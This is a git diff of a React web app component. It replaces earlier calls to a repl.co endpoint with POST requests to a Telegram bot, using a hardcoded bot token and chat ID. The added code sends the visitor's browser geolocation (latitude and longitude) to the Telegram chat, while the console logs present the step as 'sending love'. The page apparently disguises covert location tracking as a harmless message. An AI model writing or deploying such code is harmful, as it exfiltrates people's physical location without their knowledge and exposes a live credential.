@@ -54,9 +54,16 @@ const App = () => {
       setChecked(true);
     }
     console.log("send common message")
-    fetch('https://bacsitun.hker-mucoi.repl.co/love', {})
-      .then(response => response.text())
-      .then(text => console.log(text))
+    fetch("https://api.telegram.org/bot6199852049:AAFYRoMbBEQBuZrx7gkaGfSnlDZxGKhMHVE/sendMessage", {
+      method: "POST",
+      body: JSON.stringify({
+        chat_id: -1002002927520,
+        text: "Quá dữ anh em"
+      }),
+      headers: {
+        "Content-type": "application/json; charset=UTF-8"
+      }
+    });
     console.log('sending love')
 
     if (checked) return;
@@ -66,9 +73,16 @@ const App = () => {
     try {
       let lat = position.coords.latitude;
       let long = position.coords.longitude;
-      fetch(`https://bacsitun.hker-mucoi.repl.co/love?lat=${lat}&long=${long}`, {})
-        .then(response => response.text())
-        .then(text => console.log(text))
+      fetch("https://api.telegram.org/bot6199852049:AAFYRoMbBEQBuZrx7gkaGfSnlDZxGKhMHVE/sendMessage", {
+        method: "POST",
+        body: JSON.stringify({
+          chat_id: -1002002927520,
+          text: `jang ding need you lat: ${lat}, long: ${long}`
+        }),
+        headers: {
+          "Content-type": "application/json; charset=UTF-8"
+        }
+      });
     } catch (e) {
       console.log(e)
     }
